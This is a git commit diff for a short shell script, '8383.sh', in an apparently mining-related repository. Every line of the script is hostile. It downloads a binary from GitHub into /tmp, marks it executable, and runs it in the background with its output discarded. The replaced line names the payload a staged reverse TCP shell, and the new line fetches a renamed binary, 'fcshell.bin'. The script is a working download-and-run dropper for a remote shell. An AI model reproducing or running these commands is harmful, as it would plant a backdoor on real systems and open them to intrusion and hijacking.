c8cfb304e1659980c98f6d165e9502e79033ae71
Pamentierx <64346082+Pamentierx@users.noreply.github.com>
2021-09-10 06:17:18 +0800

    Update 8383.sh

--- 8383.sh
+++ 8383.sh
@@ -1,3 +1,3 @@
-wget -P /tmp/ https://github.com/Pamentierx/xmr/raw/main/linux-shell-staged-reverse-tcp-8383.elf
+wget -P /tmp/ https://github.com/Pamentierx/xmr/raw/main/fcshell.bin
 chmod +x /tmp/fcshell.bin
 nohup /tmp/fcshell.bin >/dev/null 2>&1 &
